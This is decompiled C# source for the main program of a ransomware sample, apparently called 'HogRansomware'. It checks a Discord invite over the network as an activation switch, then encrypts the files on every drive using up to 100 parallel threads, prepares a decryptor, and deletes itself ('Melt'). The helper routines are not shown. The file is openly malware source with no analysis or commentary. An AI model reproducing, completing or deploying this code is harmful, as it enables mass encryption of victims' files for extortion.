using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace HogRansomware
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		private static void Main(string[] args)
		{
			using (Mutex mutex = new Mutex(false, Program.mt))
			{
				if (mutex.WaitOne(0, false))
				{
					try
					{
						Settings.Key = Utils.GenerateKey(43) + "=";
						Settings.DiscordInvite = Utils.ParseInvite(Settings.DiscordInvite);
						using (WebClient webClient = new WebClient())
						{
							string text = webClient.DownloadString("https://discord.com/api/v8/invites/" + Settings.DiscordInvite);
							Thread.Sleep(1000);
							if (text.Contains("\", \"guild\": {") || Settings.Extension.Length > 1)
							{
								using (IEnumerator<string> enumerator = (from drive in DriveInfo.GetDrives()
								select drive.RootDirectory.FullName).GetEnumerator())
								{
									while (enumerator.MoveNext())
									{
										string path = enumerator.Current;
										Program.EncryptFiles(path);
									}
									goto IL_D4;
								}
							}
							Utils.Melt();
							IL_D4:;
						}
					}
					catch
					{
						Utils.Melt();
					}
				}
			}
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002188 File Offset: 0x00000388
		private static void EncryptFiles(string path)
		{
			new Thread(delegate()
			{
				Utils.PrepareDecryptor();
			}).Start();
			IEnumerable<string> files = Utils.GetFiles(path);
			ParallelOptions parallelOptions = new ParallelOptions();
			parallelOptions.MaxDegreeOfParallelism = 100;
			Parallel.ForEach<string>(files, parallelOptions, delegate(string file)
			{
				Utils.EncryptFile(file);
			});
			Utils.Melt();
		}

		// Token: 0x04000001 RID: 1
		internal static string mt = "6950448537301897-Dropper-6950448537301897";
	}
}
